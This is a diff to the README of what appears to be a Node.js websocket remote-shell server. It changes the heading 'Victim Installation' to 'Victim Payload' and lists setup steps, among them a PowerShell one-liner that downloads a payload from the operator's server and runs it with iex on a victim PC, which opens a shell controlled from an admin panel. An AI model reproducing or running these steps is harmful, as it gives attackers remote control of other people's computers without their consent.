@@ -26,7 +26,7 @@ This is a http/websocket server written in Nodejs with the ability to pass throu
  5. Start your node server: "node index.js" or "forever start index.js"
  6. Goto "http://[server_ip]:3395/shell.socket" in browser & enter password
 
-## Victim Installation
+## Victim Payload
  1. Edit "pl.ps1" and change the websocket address to your server: $URL = 'ws://[server_ip]:3394'
  2. Execute the payload on the remote PC: "$pl = iwr http://[server_ip]:3395/pl -UseBasicParsing; iex $pl"
  3. Check admin panel for connection
